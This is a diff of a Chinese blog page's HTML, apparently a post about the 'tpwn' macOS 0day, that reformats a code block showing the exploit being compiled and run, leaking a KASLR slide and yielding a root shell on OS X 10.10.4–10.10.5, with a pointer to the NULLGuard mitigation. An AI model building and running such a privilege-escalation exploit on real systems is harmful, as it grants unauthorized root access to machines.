@@ -51,7 +51,7 @@
 
 <meta itemprop="datePublished" content="2015-08-21T00:00:00&#43;08:00" />
 <meta itemprop="dateModified" content="2015-08-21T00:00:00&#43;08:00" />
-<meta itemprop="wordCount" content="131">
+<meta itemprop="wordCount" content="123">
 
 
 
@@ -166,28 +166,17 @@
 </ul>
 
 <h2 id="测试结果">测试结果：</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">⇒  make
+
+<pre><code>⇒  make
 gcc *.m -o tpwn -framework IOKit -framework Foundation -m32 -Wl,-pagezero_size,0 -O3
 strip tpwn
 ⇒  ./tpwn
 leaked kaslr slide, @ 0x0000000002600000
 sh-3.2# whoami
 root
-sh-3.2#</pre></td></tr></table>
-</div>
-</div>
+sh-3.2#
+</code></pre>
+
 <p>又是一个0day了，目前有10.11上面才修复了，这个影响了10.10.4和10.10.5两个版本，如果不想升级10.11的，可以安装<a href="https://github.com/kpwn/NULLGuard">NULLGuard</a></p>
 
     </div>
